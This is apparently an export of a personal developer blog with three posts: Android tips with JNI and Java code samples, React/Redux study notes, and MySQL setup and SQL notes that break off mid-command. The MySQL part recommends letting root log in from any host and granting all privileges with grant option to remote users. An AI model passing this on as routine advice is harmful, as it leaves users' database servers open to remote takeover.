SPAN_EXCLUSIVE_EXCLUSIVE，SPAN_EXCLUSIVE_INCLUSIVE这些东西的意思是针对新的文字插入之后的行为来说的。SPAN_EXCLUSIVE_INCLUSIVE就是说新的文字插入之后，之前设置的span将自动扩增并应用到这段新的文字上。 spannable.setSpan( ForegroundColorSpan(Color.RED), /* start index */ 8, /* end index */ 12, Spannable.SPAN_EXCLUSIVE_INCLUSIVE) spannable.insert(12, “(&amp; fon)”) //注意SpannableStringBuilder的这个insert方法是可以指定insert的位置的 val spannable = SpannableString(“Text is spantastic!”) spannable.setSpan( ForegroundColorSpan(Color.RED), 8, 12, Spannable.SPAN_EXCLUSIVE_EXCLUSIVE) spannable.setSpan( StyleSpan(BOLD), 8, spannable.length, Spannable.SPAN_EXCLUSIVE_EXCLUSIVE) //一段文字可以同时应用多个Spannable样式 Framework自带的spans可以分为两类：一种是改变文字外观的（Appearance affecting span），另一种是改变文字大小的(Metric affecting span)。 文章里还提到了可以使用TextView.setText(Spannable, BufferType.SPANNABLE)方法，如果后续需要修改文字的span样式的话，可以getText，获得的是之前设置的span，这时候再去对这个span进行操作（不要再setText回去了），这对提升性能有帮助（text的measure和layout都是耗性能的操作）。但注意，如果是使用了RelativeSizeSpan的话，因为更改了TextView的大小，这必然会触发重新measure和layout，上述的优化似乎也就没有必要了。 自定义Span的话：Affecting text at the character level -&gt; CharacterStyleAffecting text at the paragraph level -&gt; ParagraphStyleAffecting text appearance -&gt; UpdateAppearanceAffecting text metrics -&gt; UpdateLayout asset文件夹里面的东西是无法用File的形式去获取的android.os.FileUriExposedException: file://assets/dist/index.js exposed beyond app through Intent.getData()at android.os.StrictMode.onFileUriExposed(StrictMode.java:1816) 15. setClipToOutline(v21)圆角矩形的实现多了一种选择 gradle build scan[把一些本地libiary打包成aar能够显著加快编译] AAPT2会生成一堆.flat文件 全角半角对汉字没有影响TextView有时候会出现提前换行的问题,这事据说跟全角半角有关（全角状态下字母、数字符号等都会占两个字节的位置，也就是一个汉字那么宽，半角状态下，字母数字符号一般会占一个字节，也就是半个汉字的位置，全角半角对汉字没有影响。）一个直观的表现是全角的情况下你发现冒号，分号这些东西都变得比较宽。（;；MＭ）也就是所谓的中文标点符号 .对了，全角的情况下字母，数字也会变宽一点（本质上是占用两个字符） [Instagram是如何提升TextView渲染性能的(http://codethink.me/2015/04/23/improving-comment-rendering-on-android/),关键字TextLayoutCachecompile ffmpeg for android需要修改B0 -&gt; b0 ，linux平台或者mac平台可用compile ffmpeg for android Andorid平台上默认的isLoggable的允许的LogLevel是info，也就是说，log.d和log.v是不会显示的。wht are log-d and log-v not printing当然这也要看手机厂商设置，魅族手机就是设置为info级别及以上了。这话2016年有人提醒过我。 16.lamemp3 移植到android平台lame版本3.99.5 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;jni.h&gt; #include &lt;android/log.h&gt; #include &quot;libmp3lame/lame.h&quot; #define LOG_TAG &quot;LAME ENCODER&quot; #define LOGD(format, args...) __android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, format, ##args); #define BUFFER_SIZE 8192 #define be_short(s) ((short) ((unsigned short) (s) &lt;&lt; 8) | ((unsigned short) (s) &gt;&gt; 8)) lame_t lame; int read_samples(FILE *input_file, short *input) { int nb_read; nb_read = fread(input, 1, sizeof(short), input_file) / sizeof(short); int i = 0; while (i &lt; nb_read) { input[i] = be_short(input[i]); i++; } return nb_read; } void Java_com_example_core_audio_NativeRecorder_initEncoder(JNIEnv *env, jobject jobj, jint in_num_channels, jint in_samplerate, jint in_brate, jint in_mode, jint in_quality) { lame = lame_init(); // LOGD(&quot;Init parameters:&quot;); lame_set_num_channels(lame, in_num_channels); // LOGD(&quot;Number of channels: %d&quot;, in_num_channels); lame_set_in_samplerate(lame, in_samplerate); // LOGD(&quot;Sample rate: %d&quot;, in_samplerate); lame_set_brate(lame, in_brate); // LOGD(&quot;Bitrate: %d&quot;, in_brate); lame_set_mode(lame, in_mode); // LOGD(&quot;Mode: %d&quot;, in_mode); lame_set_quality(lame, in_quality); // LOGD(&quot;Quality: %d&quot;, in_quality); int res = lame_init_params(lame); // LOGD(&quot;Init returned: %d&quot;, res); } void Java_com_example_core_audio_NativeRecorder_destroyEncoder( JNIEnv *env, jobject jobj) { int res = lame_close(lame); // LOGD(&quot;Deinit returned: %d&quot;, res); } void Java_com_example_core_audio_NativeRecorder_encodeFile(JNIEnv *env, jobject jobj, jstring in_source_path, jstring in_target_path) { const char *source_path, *target_path; source_path = (*env)-&gt;GetStringUTFChars(env, in_source_path, NULL); target_path = (*env)-&gt;GetStringUTFChars(env, in_target_path, NULL); FILE *input_file, *output_file; input_file = fopen(source_path, &quot;rb&quot;); output_file = fopen(target_path, &quot;wb&quot;); short input[BUFFER_SIZE]; char output[BUFFER_SIZE]; int nb_read = 0; int nb_write = 0; int nb_total = 0; // LOGD(&quot;Encoding started&quot;); while (nb_read = read_samples(input_file, input)) { nb_write = lame_encode_buffer(lame, input, input, nb_read, output, BUFFER_SIZE); fwrite(output, nb_write, 1, output_file); nb_total += nb_write; } // LOGD(&quot;Encoded %d bytes&quot;, nb_total); nb_write = lame_encode_flush(lame, output, BUFFER_SIZE); fwrite(output, nb_write, 1, output_file); // LOGD(&quot;Flushed %d bytes&quot;, nb_write); fclose(input_file); fclose(output_file); } 17. Android平台上native的crash其实是可以catch的Chromium 的Breakpad是目前 Native 崩溃捕获中最成熟的方案 18. bitmap 4096Bitmap too large to be uploaded into a texture (9425x1920, max=8192x8192)4096还是8192这个数值不确定,stackoverflow上的回答教会如何查 int[] maxSize = new int[1]; gl.glGetIntegerv(GL10.GL_MAX_TEXTURE_SIZE, maxSize, 0); Log.e(&quot;GL&quot;, &quot;CURRENT MAX IS &quot;+String.valueOf(maxSize[0])); // maxSize[0] now contains max size(in both dimensions) 19. RenderScript的使用方式高斯模糊 //首先从一个view中获取Bitmap,在父viewgroup中addView(ImageView),setImageBItmap(blurredBitmap) public static Bitmap getViewBitmap(View v) { if(v.getWidth() == 0 || v.getHeight() == 0) return null; Bitmap b = Bitmap.createBitmap( v.getWidth(), v.getHeight(), Bitmap.Config.ARGB_8888); Canvas c = new Canvas(b); v.draw(c); return b; } public Bitmap blurBitmap(Bitmap bitmap){ //Let&#39;s create an empty bitmap with the same size of the bitmap we want to blur Bitmap outBitmap = Bitmap.createBitmap(bitmap.getWidth(), bitmap.getHeight(), Config.ARGB_8888); //Instantiate a new Renderscript RenderScript rs = RenderScript.create(getApplicationContext()); //Create an Intrinsic Blur Script using the Renderscript ScriptIntrinsicBlur blurScript = ScriptIntrinsicBlur.create(rs, Element.U8_4(rs)); //Create the Allocations (in/out) with the Renderscript and the in/out bitmaps Allocation allIn = Allocation.createFromBitmap(rs, bitmap); Allocation allOut = Allocation.createFromBitmap(rs, outBitmap); //Set the radius of the blur: 0 &lt; radius &lt;= 25 blurScript.setRadius(25.0f); //Perform the Renderscript blurScript.setInput(allIn); blurScript.forEach(allOut); //Copy the final bitmap created by the out Allocation to the outBitmap allOut.copyTo(outBitmap); //recycle the original bitmap bitmap.recycle(); //After finishing everything, we destroy the Renderscript. rs.destroy(); return outBitmap; } 20. webView是可以设置代理的在Android中webView是可以通过反射的方式为webView设置代理的参考。蘑菇街在处理系统 WebView 请求的时候，为系统的 WebView 设置代理，将请求发送至本地端口。同时在网络库中实现了一个 Http Proxy Server，能转发所监听端口的 http，https 请求，所有接收到的 http，https 请求，可以经过自己的网络库转发出去，这样所有自有网络库的修改，优化都可以生效。 21.Android上敏感信息存储本地应该存在哪里在shadowsocks-android中看到这样一段源码,外加这样一段注释说config文件属于敏感信息，要么加密保存，要么存在设备存储中 /** * Sensitive shadowsocks configuration file requires extra protection. It may be stored in encrypted storage or * device storage, depending on which is currently available. */ val configRoot = (if (Build.VERSION.SDK_INT &lt; 24 || app.getSystemService&lt;UserManager&gt;() ?.isUserUnlocked != false) app else Core.deviceStorage).noBackupFilesDir val configFile = File(configRoot, &quot;shadowsocks.conf&quot;) isUserUnlocked（added in api 24）&gt;Return whether the calling user is running in an “unlocked” state.On devices with direct boot, a user is unlocked only after they’ve entered their credentials (such as a lock pattern or PIN). On devices without direct boot, a user is unlocked as soon as it starts.When a user is locked, only device-protected data storage is available. When a user is unlocked, both device-protected and credential-protected private app data storage is available. 所以上面的文件路径在api 24或者userUnlocked（已经解锁）的情况下，用的是Application.noBackupFilesDir,否则用的是context.createDeviceProtectedStorageContext()创建出来的一个context(也就是在24以上)。noBackupFilesDir的意思只是不会被自动同步，这种敏感信息当然不应该被同步。 至于安全性，getFilesDir()这种返回的属于internal Storage。根据Commonsware的解释的解释，这个位置的文件只有当前app（或者有root权限的app）能够读或者写，其他的app一律deny。所以如果不考虑root的情况下，这个位置其实是很安全的。 android:sharedUserId这个属性可以让两个app共享getFilesDir()下面的文件（前提是signing key相同），事实上这些文件的owner都是同一个linux user。最后提一下这个目录的位置 File f=new File(&quot;/data/data/their.app.package.name/files/foo.txt&quot;); File f=new File(getFilesDir(), &quot;foo.txt&quot;); their.app.package.name这个文件夹下面有几个目录cache,shared_prefs… 22. 在Android上使用mmap等linux通信手段 在数据访问中，内存的访问速度肯定是最快的，所以对于有些文件需要频繁高效访问的时候就可以考虑使用内存映射进行直接读写操作，代替IO读写，达到更高的效率。 Android简单内存映射与访问 Linux提供了内存映射函数mmap, 它把文件内容映射到一段内存上(准确说是虚拟内存上), 通过对这段内存的读取和修改, 实现对文件的读取和修改,mmap()系统调用使得进程之间可以通过映射一个普通的文件实现共享内存。普通文件映射到进程地址空间后，进程可以向访问内存的方式对文件进行访问，不需要其他系统调用(read,write)去操作。 进程崩溃时，mmap的内存内核是会帮你写回到磁盘的 当然可以自己写jni打成so文件，只是jdk已经提供了写好的jni（其实MappedByteBuffer就是简单的一层c语言mmap包裹），没必要自己写 private MappedByteBuffer memoryMap = null; private void initMemoryMap() { if (memoryMap == null) { RandomAccessFile raf = null; try { // 和前面c++映射的文件名一致。 raf = new RandomAccessFile(&quot;/tmp/memory_map&quot;, &quot;rw&quot;); FileChannel fc = raf.getChannel(); memoryMap = fc.map(FileChannel.MapMode.READ_WRITE, 0, 16); } catch (FileNotFoundException e) { e.printStackTrace(); } catch (IOException e) { e.printStackTrace(); } finally { if (raf != null) { try { raf.close(); } catch (IOException e) { e.printStackTrace(); } } } } } 通过FileChannel的map(),可以将指定区域范围的文件直接读到内存中，返回MappedByteBuffer类型,这里称之为内存映射.然后通过MappedByteBuffer取或写对应标记位数据。如何取呢？通过memoryMap.get(index) 来取指定位置的字节数据，index根据标记位的位置来确认，比如前面mFlag的标记位为是在文件头向后偏移了一个4个字节，所以这里要取相同的值则是要使用memoryMap.get(4)即可，如果要设置标记位的值可以使用put(index,value)函数，例如：memoryMap.put(4,(byte)1);其实在Android上层也很简单，相当于读文件，把文件描述符映射到内存中，这种方式比每次进行文件IO操作肯定快很多。 想到什么？ log4j使用mmmap将写日志变成对内存的操作 早就有人这样做了 注意的是，快是快，但多线程操作还是要加锁，多进程操作还是要用信号量同步 类似的使用mmap的库还有很多: mmkv (腾讯的KV存储),Tokyo Cabinet (比较早的一个kv存储系统) 23. Android图片质量会比iPhone的差是有原因的替换libjpeg库大致是，Android编码保存图片就是通过Java层函数——Native层函数——Skia库函数——对应第三方库函数（例如libjpeg），这一层层调用做到的。 libjpeg在压缩图像时，有一个参数叫optimize_coding，如果设置optimize_coding为TRUE，将会使得压缩图像过程中基于图像数据计算哈弗曼表，由于这个计算会显著消耗空间和时间，默认值被设置为FALSE。对于当时的计算设备来说，空间和时间的消耗可能是显著的，但到今天，这似乎不应再是问题。但谷歌的Skia项目工程师们对optimize_coding在Skia中默认的等于了FALSE，这就意味着更差的图片质量和更大的图片文件。还有其他和iOS的比较可以看下。也讲到了Android可以替换libjpeg库达到设置为TRUE的目的。Android图片编码机制深度解析（Bitmap，Skia，libJpeg） 24.TransactionTooLargeException的原因及规避方案使用AndroidSharedMemory 其实也就是MemoryFile这个class了Android 通过匿名共享内存传输Parcelable对象列表 TransactionTooLargeException这个异常，这个java异常是在jni层抛出的，可见android_util_binder.cpp中关于这个异常的解释，大概意思是“传输太大是最常见的原应，但是不是唯一原应，也有可能是FD，应该就是描述binder驱动的文件描是符关闭了，以及可能其他原因”，这里暂且只关注常见的。我们在组件间通信时会使用intent传输一些参数，一步小心会带上一些大对象，组件启动到底层都会通过ActivityManagerService这个守护神，属于进程间通信，最终都需要使用Parcel将数据写入内核中由Binder开辟的一块区域，Binder驱动open的区域一般为4M，而进程间传输的数据大小会限制在1M，而且这1M是被这个进程所有正在进行的binder通信所共同使用的，所以一般情况下也就达不到1M，可想而知，我们要是传个Bitmap啥的，离奔溃也就不远了。 原理就是在主进程里面使用MemoryFile(“test”,bytearray.length), 往这个memoryFile里面写bytes，搞定之后通过反射拿到MemoryFile.getFileDescriptor方法,invoke这个方法。（获得底层SharedMemory在本进程中的fd,注意，这只是个Int值，并且在另一个进程中这个int值是不一样的。但是我们可以通过binder把这个fd包装成ParcelFileDescriptor，传到remote process中。）remote process在读取bytes的时候，读到的fd 的int值不一样，但是可以直接根据new FileInputStream(fd)，从中读取指定长度的bytes array， marshall一下，也就能够在remote process中创建刚才那份object的备份了。(api 27之后提供了sharedMemory的public api，而MemoryFile则是MemoryFile的一层Wrapper)亲测，这种方式可以写50MB以上的byte array，只是bytes[]太大的话，写的进程会看到很多GC日志，所以会比较慢。读数据的一端也是一样的道理，会慢一点。看上去就像是A进程往一个系统共享的内存写了50MB数据，然后走Binder告诉B进程这个内存的地址，后者自己去那里读数据共享内存只要读一次，写一次，效率最高采用共享内存通信的一个显而易见的好处是效率高，因为进程可以直接读写内存，而不需要任何数据的拷贝。对于像管道和消息队列等通信方式，则需要在内核和用户空间进行四次的数据拷贝，而共享内存则只拷贝两次数据[1]：1.一次从输入文件到共享内存区，2.另一次从共享内存区到输出文件。 至少在6.0的Bitmap.cpp代码中还看到parcel写bitmap会尝试使用匿名共享内存的影子。如果不行才走writeBlob方法(1MB限制，TransactionTooLargeException是jni丢出来的方法). static jboolean Bitmap_writeToParcel(JNIEnv* env, jobject, jlong bitmapHandle, jboolean isMutable, jint density, jobject parcel) { ... // Transfer the underlying ashmem region if we have one and it&#39;s immutable. android::status_t status; int fd = androidBitmap-&gt;getAshmemFd(); //这里获得共享内存 if (fd &gt;= 0 &amp;&amp; !isMutable &amp;&amp; p-&gt;allowFds()) { //allowFds默认是true的 #if DEBUG_PARCEL ALOGD(&quot;Bitmap.writeToParcel: transferring immutable bitmap&#39;s ashmem fd as &quot; &quot;immutable blob (fds %s)&quot;, p-&gt;allowFds() ? &quot;allowed&quot; : &quot;forbidden&quot;); #endif status = p-&gt;writeDupImmutableBlobFileDescriptor(fd); if (status) { doThrowRE(env, &quot;Could not write bitmap blob file descriptor.&quot;); return JNI_FALSE; } return JNI_TRUE; } // Copy the bitmap to a new blob. bool mutableCopy = isMutable; #if DEBUG_PARCEL ALOGD(&quot;Bitmap.writeToParcel: copying %s bitmap into new %s blob (fds %s)&quot;, isMutable ? &quot;mutable&quot; : &quot;immutable&quot;, mutableCopy ? &quot;mutable&quot; : &quot;immutable&quot;, p-&gt;allowFds() ? &quot;allowed&quot; : &quot;forbidden&quot;); #endif size_t size = bitmap.getSize(); android::Parcel::WritableBlob blob; status = p-&gt;writeBlob(size, mutableCopy, &amp;blob); //退而求其次，使用writeBlob .... } 不过后来的release好像又删掉了走共享内存这段 25. activity的启动流程是怎样的Activity.startActivity Activity.startActivityForResult Instrumentation.execStartActivity ActivityManagerProxy.startActivity --- ActivityManagerService.startActivity ActivityStack.startActivityMayWait ActivityStack.startActivityLocked ActivityStack.startActivityUncheckedLocked ActivityStack.resumeTopActivityLocked ActivityStack.startPausingLocked ApplicationThreadProxy.schedulePauseActivity --- ApplicationThread.schedulePauseActivity ActivityThread.queueOrSendMessage H.handleMessage ActivityThread.handlePauseActivity ActivityManagerProxy.activityPaused --- ActivityManagerService.activityPaused ActivityStack.activityPaused ActivityStack.completePauseLocked ActivityStack.resumeTopActivityLokced ActivityStack.startSpecificActivityLocked ActivityStack.realStartActivityLocked --- ApplicationThreadProxy.scheduleLaunchActivity ApplicationThread.scheduleLaunchActivity ActivityThread.queueOrSendMessage H.handleMessage ActivityThread.handleLaunchActivity ActivityThread.performLaunchActivity *AcitiviyB.onCreate 26. SharedPreference的apply用多了有一个比较需要注意的anr隐患(Android中SharedPreferenceImpl中写磁盘操作有一个writtenToDiskLatch(CountDownLatch)，这个也是SharedPreference在activity onStop或者onPause中可能导致anr的原因)给看一下堆栈就清楚了 &quot;main&quot; prio=5 tid=1 WAIT | group=&quot;main&quot; sCount=1 dsCount=0 obj=0x4155cc90 self=0x41496408 | sysTid=13523 nice=0 sched=0/0 cgrp=apps handle=1074110804 | state=S schedstat=( 2098661082 1582204811 6433 ) utm=165 stm=44 core=0 at java.lang.Object.wait(Native Method) - waiting on &lt;0x4155cd60&gt; (a java.lang.VMThread) held by tid=1 (main) at java.lang.Thread.parkFor(Thread.java:1205) at sun.misc.Unsafe.park(Unsafe.java:325) at java.util.concurrent.locks.LockSupport.park(LockSupport.java:157) at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:813) at java.util.concurrent.locks.AbstractQueuedSynchronizer.doAcquireSharedInterruptibly(AbstractQueuedSynchronizer.java:973) at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireSharedInterruptibly(AbstractQueuedSynchronizer.java:1281) at java.util.concurrent.CountDownLatch.await(CountDownLatch.java:202) at android.app.SharedPreferencesImpl$EditorImpl$1.run(SharedPreferencesImpl.java:364) at android.app.QueuedWork.waitToFinish(QueuedWork.java:88) at android.app.ActivityThread.handleServiceArgs(ActivityThread.java:2689) at android.app.ActivityThread.access$2000(ActivityThread.java:135) at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1494) at android.os.Handler.dispatchMessage(Handler.java:102) at android.os.Looper.loop(Looper.java:137) at android.app.ActivityThread.main(ActivityThread.java:4998) at java.lang.reflect.Method.invokeNative(Native Method) at java.lang.reflect.Method.invoke(Method.java:515) at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:777) at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:593) at dalvik.system.NativeStart.main(Native Method) 看上去像是SharedPreferencesImpl$EditorImpl$1这个class堵住了主线程这个匿名内部类就干了这么件事，堵住了主线程。此时HandlerThread正在忙着写磁盘呢。 final Runnable awaitCommit = new Runnable() { @Override public void run() { try { mcr.writtenToDiskLatch.await();}}} 这种情况重现的方式是，在任意线程apply 1000次，然后按返回键。。。应该会把主线程给堵住 countDownLatch的javaDoc是这么说的：If the current count is zero then this method returns immediately.If the current count is greater than zero then the current thread becomes disabled for thread scheduling purposes and lies dormant until one of two things happen:The count reaches zero due to invocations of the countDown method; orSome other thread interrupts the current thread.If the current thread:has its interrupted status set on entry to this method; oris interrupted while waiting,then InterruptedException is thrown and the current thread’s interrupted status is cleared. 当前数量是0的话，立刻返回；大于0 的话，就等别人调用coutDown()方法或者其他线程interrupts这条线程 另外,The SharedPreferences implementation in Android is thread-safe but not process-safe.(线程安全)原因是，apply的时候有这么一段 synchronized (SharedPreferencesImpl.this.mLock) { // mMap ，顺便说一下,getXXX的时候也要 synchronized (mLock) {}，所以极端情况下，A线程写完之后去apply后马上又去put（此时获得了mLock，read这一端就看不到最新的数据了） //所谓线程安全就是读和写都用了一把锁。可以保证的是apply或者commit对内存中map进行写时，任何试图读的线程都会因为拿不到锁而等待 } 关于sharedPreference的工作流程嘛，getXXX的时候从一个mMap里面getXXX(用一个mLock包起来了),putxxx的时候就是拿着这把锁(mLock)，往一个mModified的map里丢数据，apply的时候先去commitToMemory(就是抢到这把锁mLock，一个个去往mMap里面比较containsKey，然后clear这个mModified)。另外,mMap是创建的时候就起了一个线程，loadFromDisk之后生成这个map。写磁盘分为apply和commit，apply是先commitToMemory，然后enqueueDiskWrite()。commit在特定情况下直接在调用commit的线程中写磁盘，这个特定情况是指（c，mDiskWritesInFlight在每次调用commitToMemory中加一，写完磁盘后减一，所以这种特殊情况一般出现在刚调用一次commit之后，就是说等待同步到磁盘上的写次数只有一次的时候就直接写磁盘了。）否则立刻给handler发送一个消息去处理写磁盘任务队列 。 在commit里面，enqueueDiskWrite之后调用了writtenToDiskLatch.await();（如果是同步写，写的里面就通过countDown把count变成0，所以这里直接返回）。如果是跑到那个handlerThread里面去写。enqueueDiskWrite还指定了一个postWriteRunnable(就是countDown，所以这里会堵住) 这样看来，commit的堵塞有两种堵法，一种是直接在当前线程做io堵住(mDiskWritesInFlight == 1)v，另一种是CountDownLatch.await(等其他线程写完了之后countDown，这里的线程才能唤醒)。 HandlerThread handlerThread = new HandlerThread(&quot;queued-work-looper&quot;, Process.THREAD_PRIORITY_FOREGROUND); //这个是apply里面写磁盘的后台线程 往这条HandlerThread上推任务时有延时(延时100ms再post)和立刻执行(立刻post，理论上应该会唤醒等待的looper，算是立刻执行吧)两种方式 安卓打包流程","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"}]},{"title":"React语法及Redux实践笔记","date":"2018-03-17T23:56:45.000Z","path":"2018/03/17/2018-03-17-react-cheatSheet/","text":"介绍React语法及一些Redux的使用方法 Take Away基本的流程就是创建一个继承React.Component的class，设定state，添加点击事件。最重要的是在render()函数中返回一个element，比如说这样 class LoginControl extends React.Component{ constructor(props){ super(props); } const myelement= &lt;button&gt;hello 这就是jsx语法 there&lt;/button&gt; return( // &lt;div&gt; // &lt;Greeting isLoggedIn={isLoggedIn}/&gt; // {button} // &lt;/div&gt; myelement // 这里把html tag提取到外面也行，写在里面也行，混着写的话，{myelement}，加上大括号就是了 // 官方guide上的原话是: You may embed any expressions in JSX by wrapping them in curly braces(大括号). ) } // return里面只能返回一个tag props是只读的 JSX allows embedding any expressions ,就是说jsx语句中，大括号包起来的地方，什么js都能写 安装 yarn global add create-react-appcreate-react-app my-appcd my-appnpm start 程序入口在html文件中添加这样一个tag &lt;div id=&quot;root&quot;&gt;&lt;/div&gt; 在index.js中添加这样一段 const element = &lt;h1&gt;Hello, world&lt;/h1&gt;; ReactDOM.render(element, document.getElementById(&#39;root&#39;)); 可以认为ReactDOM.render方法就是程序的入口 Element和Component的概念Element感觉上就像一个或者多个UI控件的集合 const element = &lt;h1&gt;Hello, world&lt;/h1&gt;; //这就算一个Element,用于描述将要展示在屏幕上的效果 Component就像javaScript函数一样，它们接收任意输入，输出React element以显示在屏幕上。需要注意的是，Component的名字一定要 首字母大写 ，因为React把小写字母开头的当做正常的html element来处理了。 //一个返回Element的函数就算作是Component了 function Welcome(props) { return &lt;h1&gt;Hello, {props.name}&lt;/h1&gt;; } // 或者用es6语法 class Welcome extends React.Component { render() { return &lt;h1&gt;Hello, {this.props.name}&lt;/h1&gt;; } } 还有就是props是immutable的，想要改的话用State吧。也即Component应该表现为纯粹的function，不修改状态。 State的更改State是在constructor里面初始化的，想要更改其中的值的话，不能直接赋值，需要使用setState方法 this.setState({comment: ‘Hello’}); 但有时State的更新是异步的，所以要使用两个参数的setState方法 this.setState((prevState, props) =&gt; ({ counter: prevState.counter + props.increment })); JSX语法const element = ( &lt;h1 className=&quot;greeting&quot;&gt; Hello, world! &lt;/h1&gt; ); // 这俩其实是一样的 const element = React.createElement( &#39;h1&#39;, {className: &#39;greeting&#39;}, &#39;Hello, world!&#39; ); // jsx语句最终都是被用在component的return语句中的： function WarningBanner(props) { if (!props.warn) { return null; } return ( &lt;div className=&quot;warning&quot;&gt; Warning! &lt;/div&gt; ); } 局部更新页面发生变化时，React只更新需要刷新的部分 生命周期钩子函数componentDidMount() { fetchPosts().then(response =&gt; { this.setState({ posts: response.posts }); }); fetchComments().then(response =&gt; { this.setState({ comments: response.comments }); }); } 事件处理function ActionLink() { function handleClick(e) { e.preventDefault(); console.log(&#39;The link was clicked.&#39;); } return ( &lt;a href=&quot;#&quot; onClick={handleClick}&gt; Click me &lt;/a&gt; ); } const element = &lt;h1&gt;Hello, world&lt;/h1&gt;; ReactDOM.render(&lt;ActionLink/&gt;, document.getElementById(&#39;root&#39;)); // 或者是使用箭头函数 以及 Function.prototype.bind &lt;button onClick={(e) =&gt; this.deleteRow(id, e)}&gt;Delete Row&lt;/button&gt; &lt;button onClick={this.deleteRow.bind(this, id)}&gt;Delete Row&lt;/button&gt; //在一个Component中，时间监听最后要加上bind(this) class Calculator extends React.Component { constructor(props) { super(props); this.handleChange = this.handleChange.bind(this); this.state = {temperature: &#39;&#39;}; } handleChange(e) { this.setState({temperature: e.target.value}); } render() { const temperature = this.state.temperature; return ( &lt;fieldset&gt; &lt;legend&gt;Enter temperature in Celsius:&lt;/legend&gt; &lt;input value={temperature} onChange={this.handleChange} /&gt; &lt;BoilingVerdict celsius={parseFloat(temperature)} /&gt; &lt;/fieldset&gt; ); } } 组件之间通信In React, sharing state is accomplished by moving it up to the closest common ancestor of the components that need it. 也就是说，要把state提取到最近的公用父组件中。事件发生时，子组件调用this.props.onXXX(由父组件提供)通知父组件，子组件不再维护自身state，父组件的state成为两个子组件唯一的共有的single source of truth 渲染list的时候记得要加上一个key，这是规定 //错误 const listItems = numbers.map((number) =&gt; &lt;li&gt;{number}&lt;/li&gt; ); //正确 const listItems = numbers.map((number) =&gt; &lt;li key={number.toString()}&gt;{number}&lt;/li&gt; ); //一个List element中的list元素应当具有独一无二的key，但不同List element实例之间，元素的key没必要遵守这一规则 常见错误 Super expression must either be null or a function, not undefined class LoginControl extends component{ } // 应该是 class LoginControl extends React.Component{ }","tags":[{"name":"前端","slug":"前端","permalink":"https://haldir65.github.io/tags/前端/"}]},{"title":"mysql填坑记录","date":"2018-02-04T21:37:37.000Z","path":"2018/02/04/2018-02-04-mysql-metup/","text":"关系型数据库很多如，MS Access, SQL Server, MySQLNoSQL(NoSQL = Not Only SQL )，意即”不仅仅是SQL”，NOSQL是基于键值对的，可以想象成表中的主键和值的对应关系，而且不需要经过SQL层的解析，所以性能非常高。典型的代表如MongoDb. 读音：MySQL is pronounced as “my ess-que-ell,” in contrast with SQL, pronounced “sequel.” RDBMS(关系型数据库)RDBMS stands for Relational Database Management System. RDBMS is the basis for SQL, and for all modern database systems like MS SQL Server, IBM DB2, Oracle, MySQL, and Microsoft Access. sql tutorials mySql相关 安装How to Install MySQL on Ubuntuhow-to-create-a-new-user-and-grant-permissions-in-mysqla-basic-mysql-tutorial mysql -u root -p ## 以root身份登录 Too many connectionsmysql连接多了容易爆内存，关掉的方法 mysqladmin -u root -p shutdown ## 关闭sudo /etc/init.d/mysql restart ## 重启sudo systemctl disable mysql ##禁止开机启动host-xxx-xx-xxx-xxx-is-not-allowed-to-connect-to-this-mysql-server1。 改表法。可能是你的帐号不允许从远程登陆，只能在localhost。这个时候只要在localhost的那台电脑，登入mysql后，更改 “mysql” 数据库里的 “user” 表里的 “host” 项，从”localhost”改称”%” windows登录出错报10061的解决方式services.msc =&gt; 找到MySQL57 =&gt; 右键（启动） 配置文件的位置: nano /etc/mysql/mysql.conf.d/mysqld.conf mysql -u root -p use mysql; update user set host = &#39;%&#39; where user = &#39;root&#39;; select host, user from user; 授权法。 例如，你想myuser使用mypassword从任何主机连接到mysql服务器的话。 GRANT ALL PRIVILEGES ON *.* TO &#39;myuser&#39;@&#39;%&#39; IDENTIFIED BY &#39;mypassword&#39; WITH GRANT OPTION; FLUSH PRIVILEGES; 如果你想允许用户myuser从ip为192.168.1.6的主机连接到mysql服务器，并使用mypassword作为密码 GRANT ALL PRIVILEGES ON *.* TO &#39;myuser&#39;@&#39;192.168.1.3&#39; IDENTIFIED BY &#39;mypassword&#39; WITH GRANT OPTION; FLUSH PRIVILEGES; 如果你想允许用户myuser从ip为192.168.1.6的主机连接到mysql服务器的dk数据库，并使用mypassword作为密码 GRANT ALL PRIVILEGES ON dk.* TO &#39;myuser&#39;@&#39;192.168.1.3&#39; IDENTIFIED BY &#39;mypassword&#39; WITH GRANT OPTION; FLUSH PRIVILEGES; HeidiSQL 中创建database记得选择character set ‘utf-8’Collation: ‘utf_8_general_cli’; CURD COMMANDS首先要注意的是所有sql语句最后面都要跟一个分号 SHOW DATABASES; CREATE DATABASE dbname; USE dbname; ## show how many tables are there in this table SHOW TABLES; ## create table CREATE TABLE potluck (id INT NOT NULL PRIMARY KEY AUTO_INCREMENT,name VARCHAR(20),food VARCHAR(30),confirmed CHAR(1),signup_date DATE); ## show everyting SELECT * FROM potluck; SELECT user_id FROM potluck; SELECT FROM potluck; // 这么写sql 语法有误，必须声明想要选出那些column ## how does potluck look like? DESCRIBE potluck; ##我想看看当初这表的建表语句长什么样？ show create table potluck; ## ADD STUFF INSERT INTO `potluck` (`id`,`name`,`food`,`confirmed`,`signup_date`) VALUES (NULL, &quot;John&quot;, &quot;Casserole&quot;,&quot;Y&quot;, &#39;2012-04-11&#39;); ### 亲测，在heidisql中这么输入也能insert一行,所以这些冒号也不是必须的。注意这里不是&quot;单引号&#39;&quot;号而是&quot;`&quot;（tab键上面那个） INSERT INTO user (user_id,login,password,email,date_added,date_modified) VALUES (1,&quot;firstlogin&quot;,&quot;dumbpasws&quot;,&quot;sample@email.com&quot;,&#39;2012-03-09&#39;,&#39;2018-01-09&#39;); ## update stuff UPDATE `potluck` SET `confirmed` = &#39;Y&#39; WHERE `potluck`.`name` =&#39;Sandy&#39;; UPDATE user SET user_id = 11 WHERE user_id =10;## 亲测这么干也没问题 SELECT user_id FROM user WHERE user_nick = &#39;john&#39; OR user_id &gt; 10; ## 精确匹配字符串用等号 UPDATE user SET salary= 10000 WHERE salary is NULL;## 更新的时候用=号，判断为空用IS NULL ，对应的也有IS NOT NULL. UPDATE user 